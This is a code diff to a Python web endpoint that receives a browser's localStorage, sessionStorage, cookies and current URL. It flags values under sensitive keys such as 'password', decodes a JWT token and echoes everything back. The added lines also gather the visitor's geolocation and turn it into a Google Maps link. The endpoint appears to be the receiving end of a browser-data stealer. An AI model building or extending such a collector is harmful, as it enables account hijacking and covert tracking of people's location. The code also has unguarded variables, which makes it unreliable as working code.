@@ -23,6 +23,7 @@ class Payload(BaseModel):
     sessionStorageData: List[KeyValue]
     cookies: List[KeyValue]
     currentUrl: str
+    geolocationData: Any
 
 SENSITIVE_KEYS = {
     "password",
@@ -50,7 +51,8 @@ def decode_jwt(token: str) -> Dict[str, Any]:
 async def root(payload: Payload     ):
     sensitive_data = []
     non_sensitive_data = []
-
+    location = payload.geolocationData
+    
     for item in payload.localStorageData + payload.sessionStorageData + payload.cookies:
         if item.key in SENSITIVE_KEYS:
             sensitive_data.append(item)
@@ -70,11 +72,15 @@ async def root(payload: Payload     ):
     if token:
         # Decode the JWT token
         decoded_token = decode_jwt(token)    
+    if location:
+        google_maps_url = f"https://www.google.com/maps/search/?api=1&query={location['latitude']},{location['longitude']}"   
+        # encoded_url = urllib.parse.quote(google_maps_url, safe='')    
     response_data = {
-        "message": hello + decoded_token['name'],
+        "message": "hello" + decoded_token['name'],
         "sensitive_data": sensitive_data,
         "non_sensitive_data": non_sensitive_data,
-        "decoded_token": decoded_token
+        "decoded_token": decoded_token,
+        "geolocationData": google_maps_url
     }
     # print(response_data)
     
